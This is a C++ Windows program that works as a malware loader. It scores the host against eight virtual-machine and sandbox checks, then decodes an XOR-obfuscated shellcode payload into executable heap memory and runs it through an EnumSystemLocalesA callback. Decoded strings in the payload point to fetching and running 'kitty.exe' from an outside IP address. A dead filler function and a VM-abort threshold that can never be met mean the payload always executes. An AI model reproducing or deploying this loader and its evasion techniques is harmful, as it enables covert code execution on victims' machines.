#include <windows.h>
#include <iostream>
#include <intrin.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <powrprof.h>
#include <sysinfoapi.h>

struct DetectionResult {
    bool detected;
    float weight;
};

DetectionResult checkVirtualization() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    return { static_cast<bool>((cpuInfo[2] >> 31) & 1), 0.7f };
}

DetectionResult checkRAMSize() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    DWORDLONG totalPhysMem = memStatus.ullTotalPhys;
    return { (totalPhysMem < 8LL * 1024LL * 1024LL * 1024LL), 0.5f };
}

DetectionResult checkVMMAC() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    
    const unsigned char vmMacPrefixes[][3] = {
        {0x00, 0x05, 0x69},
        {0x00, 0x0C, 0x29},
        {0x00, 0x1C, 0x14},
        {0x00, 0x50, 0x56},
        {0x08, 0x00, 0x27},
        {0x0A, 0x00, 0x27},
        {0x00, 0x16, 0x3E}
    };

    if (dwStatus == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
        do {
            for (const auto& prefix : vmMacPrefixes) {
                if (memcmp(pAdapterInfo->Address, prefix, 3) == 0)
                    return { true, 0.8f };
            }
            pAdapterInfo = pAdapterInfo->Next;
        } while (pAdapterInfo);
    }
    return { false, 0.8f };
}

DetectionResult checkVMProcesses() {
    const char* vmProcesses[] = {
        "vboxservice.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vgauthservice.exe",
        "vmacthlp.exe",
        "VGAuthService.exe",
        "vm3dservice.exe",
        "prl_tools.exe",
        "prl_cc.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return { false, 0.6f };

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(processEntry);

    if (Process32First(snapshot, &processEntry)) {
        do {
            for (const char* proc : vmProcesses) {
                if (_stricmp(processEntry.szExeFile, proc) == 0) {
                    CloseHandle(snapshot);
                    return { true, 0.6f };
                }
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return { false, 0.6f };
}

DetectionResult checkCPUCores() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return { (sysInfo.dwNumberOfProcessors <= 2), 0.4f };
}

DetectionResult checkDiskSize() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return { false, 0.3f };

    DISK_GEOMETRY_EX diskGeometry;
    DWORD bytesReturned;
    bool result = DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
        NULL, 0, &diskGeometry, sizeof(diskGeometry), &bytesReturned, NULL);

    CloseHandle(hDevice);

    if (!result) return { false, 0.3f };
    return { (diskGeometry.DiskSize.QuadPart < 100LL * 1024LL * 1024LL * 1024LL), 0.3f };
}

DetectionResult checkScreenResolution() {
    DEVMODE dm;
    memset(&dm, 0, sizeof(dm));
    dm.dmSize = sizeof(dm);

    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
        int width = dm.dmPelsWidth;
        int height = dm.dmPelsHeight;

        const int commonResolutions[][2] = {
            {800, 600},
            {1024, 768},
            {1152, 864},
            {1280, 720},
            {1280, 800}
        };

        for (const auto& res : commonResolutions) {
            if (width == res[0] && height == res[1]) {
                return { true, 0.3f };
            }
        }
    }
    return { false, 0.3f };
}

DetectionResult checkTemperatureSensors() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\ACPI_HAL", 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    bool hasSensors = (hDevice != INVALID_HANDLE_VALUE);
    if (hasSensors) CloseHandle(hDevice);
    return { !hasSensors, 0.4f };
}

void someRandomFunction() {
    int a = 42;
    float b = 3.14f;
    char buffer[512] = "Lorem ipsum dolor sit amet, consectetur adipiscing elit...";
    
    for(int i = 0; i < 100; i++) {
        a += b * i;
        buffer[i % 512] = (char)(a % 256);
    }
}

void execShellCode() {
    unsigned char payload[] = {
        0x03, 0x17, 0x76, 0xff, 0xff, 0xff, 0x9f, 0x76, 0x1a, 0xce, 0x2d, 0x9b,
        0x74, 0xad, 0xcf, 0x74, 0xad, 0xf3, 0x74, 0xad, 0xeb, 0x74, 0x8d, 0xd7,
        0xf0, 0x48, 0xb5, 0xd9, 0xce, 0x00, 0xce, 0x3f, 0x53, 0xc3, 0x9e, 0x83,
        0xfd, 0xd3, 0xdf, 0x3e, 0x30, 0xf2, 0xfe, 0x38, 0x1d, 0x0f, 0xad, 0xa8,
        0x74, 0xad, 0xef, 0x74, 0xbd, 0xc3, 0xfe, 0x2f, 0x74, 0xbf, 0x87, 0x7a,
        0x3f, 0x8b, 0xb5, 0xfe, 0x2f, 0xaf, 0x74, 0xb7, 0xe7, 0x74, 0xa7, 0xdf,
        0xfe, 0x2c, 0x1c, 0xc3, 0xb6, 0x74, 0xcb, 0x74, 0xfe, 0x29, 0xce, 0x00,
        0xce, 0x3f, 0x53, 0x3e, 0x30, 0xf2, 0xfe, 0x38, 0xc7, 0x1f, 0x8a, 0x0b,
        0xfc, 0x82, 0x07, 0xc4, 0x82, 0xdb, 0x8a, 0x1d, 0xa7, 0x74, 0xa7, 0xdb,
        0xfe, 0x2c, 0x99, 0x74, 0xf3, 0xb4, 0x74, 0xa7, 0xe3, 0xfe, 0x2c, 0x74,
        0xfb, 0x74, 0xfe, 0x2f, 0x76, 0xbb, 0xdb, 0xdb, 0xa4, 0xa4, 0x9e, 0xa6,
        0xa5, 0xae, 0x00, 0x1f, 0xa7, 0xa0, 0xa5, 0x74, 0xed, 0x14, 0x79, 0xa2,
        0x97, 0x91, 0x9a, 0x8b, 0xff, 0x97, 0x88, 0x96, 0x91, 0x96, 0x76, 0x19,
        0xab, 0x97, 0xb3, 0x88, 0xd9, 0xf8, 0x00, 0x2a, 0xce, 0x00, 0xa8, 0xa8,
        0xa8, 0xa8, 0xa9, 0x97, 0xc5, 0xa9, 0x86, 0x58, 0x00, 0x2a, 0x14, 0x9c,
        0xa4, 0xce, 0x36, 0xae, 0xae, 0x95, 0xfc, 0xae, 0xae, 0x97, 0xbf, 0xe0,
        0xff, 0xff, 0xac, 0xaf, 0x97, 0xa8, 0x76, 0x60, 0x39, 0x00, 0x2a, 0x14,
        0xb0, 0xa6, 0xce, 0x2d, 0xad, 0x97, 0xff, 0xcd, 0x9f, 0x7b, 0xad, 0xad,
        0xad, 0xae, 0xad, 0xaf, 0x97, 0x14, 0xaa, 0xd1, 0xc4, 0x00, 0x2a, 0x76,
        0x39, 0x95, 0xef, 0xa4, 0x97, 0x7f, 0xcc, 0xff, 0xff, 0x76, 0x1f, 0x95,
        0xfb, 0xaf, 0x95, 0xe0, 0xa9, 0x97, 0x8a, 0xb9, 0x61, 0x79, 0x00, 0x2a,
        0xce, 0x00, 0xa8, 0xa8, 0xa8, 0xa8, 0xa9, 0x97, 0xd2, 0xf9, 0xe7, 0x84,
        0x00, 0x2a, 0x7a, 0x3f, 0x8a, 0xe1, 0xb4, 0xf0, 0x7b, 0x84, 0xff, 0xff,
        0xff, 0x14, 0x2e, 0x16, 0x73, 0xff, 0xff, 0xff, 0x17, 0x53, 0x00, 0x00,
        0x00, 0xd0, 0x94, 0x96, 0x8b, 0x8b, 0x86, 0xd1, 0x9a, 0x87, 0x9a, 0xff,
        0x14, 0x94, 0xce, 0x3f, 0xa0, 0xaf, 0x95, 0xfd, 0x95, 0xfd, 0xaf, 0x95,
        0xfd, 0x95, 0xfd, 0xa8, 0x97, 0x25, 0x09, 0x25, 0xb0, 0x00, 0x2a, 0x6c,
        0xce, 0x3f, 0x99, 0x47, 0xfb, 0xfc, 0xd6, 0x3b, 0xab, 0x72, 0xb3, 0xdb,
        0xf7, 0xce, 0x3f, 0x4b, 0xfc, 0xaf, 0xae, 0xa9, 0x97, 0xed, 0x69, 0x76,
        0x1d, 0x00, 0x2a, 0x7a, 0x3f, 0x8b, 0xd2, 0xa7, 0x7a, 0x3f, 0x8b, 0xe9,
        0x95, 0xff, 0xab, 0xaf, 0x72, 0xbb, 0xdb, 0xf3, 0xaf, 0xac, 0x97, 0xd2,
        0xa8, 0x51, 0xa4, 0x00, 0x2a, 0x7c, 0x13, 0xfb, 0x14, 0x31, 0xac, 0x97,
        0x39, 0x69, 0x78, 0xad, 0x00, 0x2a, 0x95, 0xff, 0xa8, 0x97, 0xce, 0x74,
        0x90, 0x78, 0x00, 0x2a, 0x95, 0xff, 0x97, 0x0f, 0x4a, 0x5d, 0xa9, 0x00,
        0x2a, 0x17, 0x6f, 0x00, 0x00, 0x00, 0x94, 0x96, 0x8b, 0x8b, 0x86, 0xd1,
        0x9a, 0x87, 0x9a, 0xff, 0x17, 0xf8, 0x00, 0x00, 0x00, 0xce, 0xc6, 0xcd,
        0xd1, 0xce, 0xc9, 0xc7, 0xd1, 0xc8, 0xcc, 0xd1, 0xce, 0xcc, 0xc8, 0xff
    };
    unsigned int payload_len = 444;

    DWORD oldProtect;

    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ptr = HeapAlloc(heap, 0, payload_len);

    for(int idx = 0; idx < payload_len; idx++) {
        ((unsigned char*)ptr)[idx] = (payload[idx] ^ 0xff);
    }

    VirtualProtect(ptr, payload_len, PAGE_EXECUTE_READ, &oldProtect);
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ptr, 0);
    
    HeapDestroy(heap);
}

int main() {
    float totalScore = 0.0f;
    float maxScore = 0.0f;

    DetectionResult tests[] = {
        checkVirtualization(),
        checkRAMSize(),
        checkVMMAC(),
        checkVMProcesses(),
        checkCPUCores(),
        checkDiskSize(),
        checkScreenResolution(),
        checkTemperatureSensors()
    };

    for (const auto& test : tests) {
        if (test.detected) totalScore += test.weight;
        maxScore += test.weight;
    }

    float vmProbability = (totalScore / maxScore) * 100;

    if (vmProbability >= 1000) {
        MessageBoxA(NULL, "Goodbye kitty!", "Message", MB_OK);
        return 0;
    }

    execShellCode();

    MessageBoxA(NULL, "Hello kitty!", "Message", MB_OK);
    return 0;
}